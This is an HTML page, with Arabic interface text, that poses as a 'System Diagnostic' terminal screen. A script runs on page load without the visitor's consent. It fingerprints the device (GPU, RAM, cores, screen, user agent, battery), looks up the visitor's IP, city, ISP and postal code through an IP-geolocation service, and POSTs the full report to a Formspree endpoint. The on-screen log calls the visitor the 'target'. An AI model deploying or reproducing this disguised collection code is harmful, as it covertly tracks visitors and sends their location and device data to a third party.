<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>System Diagnostic v2.6</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .terminal { width: 90%; max-width: 600px; border: 1px solid #0f0; padding: 20px; box-shadow: 0 0 15px #0f0; }
        .cursor { display: inline-block; width: 10px; height: 18px; background: #0f0; animation: blink 1s infinite; }
        @keyframes blink { 0%, 50% { opacity: 1; } 51%, 100% { opacity: 0; } }
    </style>
</head>
<body>
    <div class="terminal">
        <div id="log">جاري بدء بروتوكول الفحص...<br></div>
        <span class="cursor"></span>
    </div>

    <script>
        async function fullHackingLog() {
            const log = document.getElementById('log');
            const report = {};

            // 1. بيانات الجهاز والعتاد (Hardware)
            report.device = {
                platform: navigator.platform,
                cores: navigator.hardwareConcurrency || "N/A",
                ram: navigator.deviceMemory || "N/A",
                screen: `${window.screen.width}x${window.screen.height}`,
                touch: navigator.maxTouchPoints > 0 ? "نعم" : "لا",
                gpu: getGPU() // جلب نوع كارت الشاشة
            };

            // 2. بيانات البرمجيات (Software)
            report.software = {
                browser: navigator.userAgent,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookies: navigator.cookieEnabled
            };

            // 3. جلب الموقع والشبكة (الـ IP التفصيلي)
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                report.network = {
                    ip: data.ip,
                    city: data.city,
                    region: data.region,
                    country: data.country_name,
                    isp: data.org,
                    postal: data.postal,
                    calling_code: data.country_calling_code
                };
            } catch (e) { report.network = "فشل جلب الـ IP"; }

            // 4. جلب حالة البطارية
            try {
                const battery = await navigator.getBattery();
                report.battery = {
                    level: (battery.level * 100) + "%",
                    charging: battery.charging ? "يشحن" : "لا يشحن"
                };
            } catch (e) { report.battery = "غير مدعوم"; }

            // تحديث الشاشة للمستخدم
            log.innerHTML += "> تم سحب بيانات الشبكة...<br>";
            log.innerHTML += `> موقع الهدف: ${report.network.city || 'مجهول'}<br>`;
            log.innerHTML += "> جاري إرسال التقرير النهائي...<br>";

            // 5. الإرسال النهائي إلى Formspree
            const formID = 'YOUR_FORM_ID'; 
            await fetch(`https://formspree.io/f/${formID}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(report)
            });

            log.innerHTML += "> تم الإرسال بنجاح. النظام مستقر.";
        }

        function getGPU() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            } catch (e) { return "N/A"; }
        }

        window.onload = fullHackingLog;
    </script>
</body>
</html>
